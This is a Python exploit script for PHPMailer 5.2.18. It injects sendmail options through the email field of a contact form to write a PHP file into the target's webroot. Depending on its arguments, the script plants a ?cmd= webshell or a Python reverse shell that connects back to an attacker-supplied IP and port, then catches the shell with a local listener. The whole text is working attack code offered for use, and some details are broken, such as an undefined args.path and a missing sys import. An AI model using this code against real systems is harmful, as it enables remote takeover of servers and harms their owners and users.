"""
This script can deliver two payloads if attacker ip and port is specified it will send a reverse shell to the ip
and if only the target is specified it will create a php webshell which can be triggerd with ?cmd= ;)
"""
import argparse
import requests
from requests_toolbelt import MultipartEncoder
import threading
import socket
import telnetlib
import time

RED = "\033[1;31m"
BLUE = "\033[1;34m"
END = '\033[0m'

print("PhpMailer 5.2.18 Exploit")
parser = argparse.ArgumentParser()
parser.add_argument('-t', '--target', type=str,  help='phpmailer/wp target with path to contact.php', required=True)
parser.add_argument('-w', '--webroot', type=str, help='webroot on the target machine', default='/var/www/html/pay.php')
parser.add_argument('-a', '--attacker', type=str, help='attacker ip')
parser.add_argument('-p', '--port', type=str, help='port for rev shell')

args = parser.parse_args()
target = args.target
webroot = args.webroot
port = args.port
file = '/' + webroot.split('/')[4]


def handle_client():
    print(f'{BLUE}Listening on {args.port}{END}')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    t = telnetlib.Telnet()
    s.bind((str(args.attacker), int(port)))
    s.listen(1)
    conn, addr = s.accept()
    time.sleep(10)
    t.sock = conn
    t.interact()


if not args.target:
    parser.print_help()
    sys.exit(-1)
else:
    try:
        if not args.attacker:
            payload = '<?php system($_REQUEST[\'cmd\']); ?>'
            fields = {'action': 'submit',
                      'name': payload,
                      'email': '"ganx\\\" -OQueueDirectory=/tmp -X/var/www/html/pay.php server" @protonmail.com',
                      'message': 'Pwned'}
            m = MultipartEncoder(fields=fields,
                                 boundary='----WebKitFormBoundaryzXJpHSq4mNy35tHe')

            headers = {'User-Agent': 'curl/7.47.0',
                       'Content-Type': m.content_type}

            print(f'{RED}attacker port not found in args{END}')
            print(f'{BLUE}trying to create {args.path}{END}')
            r = requests.post(target, data=m.to_string(),
                              headers=headers)
            if r.status_code == 200:
                print(f'Successfully created {args.path}')
            print('Failed :(')

        else:
            payload = f'<?php system(\'python -c """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\'{args.attacker}\\\',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])"""\'); ?>'
            fields = {'action': 'submit',
                      'name': payload,
                      'email': '"ganx\\\" -OQueueDirectory=/tmp -X/var/www/html/pay.php server" @protonmail.com',
                      'message': 'Pwned'}
            m = MultipartEncoder(fields=fields,
                                 boundary='----WebKitFormBoundaryzXJpHSq4mNy35tHe')

            headers = {'User-Agent': 'curl/7.47.0',
                       'Content-Type': m.content_type}

            print(f'Uploading File to {webroot}')
            r = requests.post(target, data=m.to_string(),
                              headers=headers)
            if r.status_code == 200:
                t = threading.Thread(target=handle_client)
                t.start()
                requests.get('http://' + target.split('/')[2] + file, headers=headers)
    except Exception as e:
        print(f'{RED}{e}{END}')
